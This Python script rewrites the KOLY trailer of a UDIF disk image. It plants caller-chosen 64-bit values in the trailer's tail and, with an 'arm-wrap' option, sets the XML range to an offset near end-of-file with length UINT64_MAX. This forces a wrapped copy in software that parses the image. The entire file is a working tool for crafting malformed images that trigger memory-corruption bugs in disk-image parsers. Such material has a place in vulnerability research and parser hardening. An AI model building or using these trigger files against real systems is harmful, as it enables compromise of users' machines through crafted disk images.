#!/usr/bin/env python3
"""Patch a short source window in the final KOLY bytes.

This is intentionally separate from patch_validated_udif_bounded_wrap.py: the
older helper preserves the complete trailer, while this tool is for measuring
whether otherwise-unused trailer-tail bytes can carry a very short wrapped
copy.
"""

from __future__ import annotations

import argparse
import hashlib
import os
import struct
from pathlib import Path


KOLY_SIZE = 0x200
XML_RANGE_FIELD = 0xD8
XML_RANGE_SIZE = 0x10
MAX_U64 = 0xFFFFFFFFFFFFFFFF


def parse_int(value: str) -> int:
    return int(value, 0)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("image", type=Path)
    parser.add_argument("--copy-span", type=parse_int, default=0x20)
    parser.add_argument("--pattern-offset", type=parse_int, default=0x10)
    parser.add_argument("--qword0", type=parse_int, default=0)
    parser.add_argument("--qword1", type=parse_int, required=True)
    parser.add_argument(
        "--arm-wrap",
        action="store_true",
        help="set xmlOffset=EOF-copy-span and xmlLength=UINT64_MAX",
    )
    args = parser.parse_args()

    if args.copy_span < 0x10 or args.copy_span % 0x10:
        parser.error("copy span must be a positive multiple of 16")
    if args.copy_span > KOLY_SIZE:
        parser.error("copy span must stay within the final KOLY trailer")
    if args.pattern_offset < 0 or args.pattern_offset + 0x10 > args.copy_span:
        parser.error("the 16-byte pattern must fit inside the copy window")
    for name, value in (("qword0", args.qword0), ("qword1", args.qword1)):
        if not 0 <= value <= MAX_U64:
            parser.error(f"{name} must fit in uint64")

    with args.image.open("r+b", buffering=0) as image:
        size = os.fstat(image.fileno()).st_size
        if size < KOLY_SIZE:
            raise ValueError("image is smaller than a KOLY trailer")
        trailer = size - KOLY_SIZE
        image.seek(trailer)
        if image.read(4) != b"koly":
            raise ValueError("image does not end in a KOLY trailer")

        source_offset = size - args.copy_span
        pattern_offset = source_offset + args.pattern_offset
        xml_range_start = trailer + XML_RANGE_FIELD
        xml_range_end = xml_range_start + XML_RANGE_SIZE
        pattern_end = pattern_offset + 0x10
        if pattern_offset < xml_range_end and pattern_end > xml_range_start:
            raise ValueError("pattern overlaps the KOLY XML range fields")

        image.seek(pattern_offset)
        old_pattern = image.read(0x10)
        if len(old_pattern) != 0x10:
            raise ValueError("short read of trailer-tail pattern")
        image.seek(pattern_offset)
        image.write(struct.pack("<QQ", args.qword0, args.qword1))

        image.seek(xml_range_start)
        old_xml_pair = image.read(XML_RANGE_SIZE)
        if len(old_xml_pair) != XML_RANGE_SIZE:
            raise ValueError("short read of KOLY XML range")
        if args.arm_wrap:
            image.seek(xml_range_start)
            image.write(struct.pack(">QQ", source_offset, MAX_U64))

        os.fsync(image.fileno())

    old_xml_offset, old_xml_length = struct.unpack(">QQ", old_xml_pair)
    digest = hashlib.sha256(args.image.read_bytes()).hexdigest()
    print(
        f"UDIF_TAIL_PATCHED image={args.image} size=0x{size:x} "
        f"trailer=0x{trailer:x} source_offset=0x{source_offset:x} "
        f"copy_span=0x{args.copy_span:x} pattern_offset=0x{pattern_offset:x} "
        f"pattern_relative=0x{args.pattern_offset:x} "
        f"qword0=0x{args.qword0:x} qword1=0x{args.qword1:x} "
        f"old_pattern={old_pattern.hex()} arm_wrap={int(args.arm_wrap)} "
        f"old_xml_offset=0x{old_xml_offset:x} "
        f"old_xml_length=0x{old_xml_length:x} sha256={digest}",
        flush=True,
    )


if __name__ == "__main__":
    main()
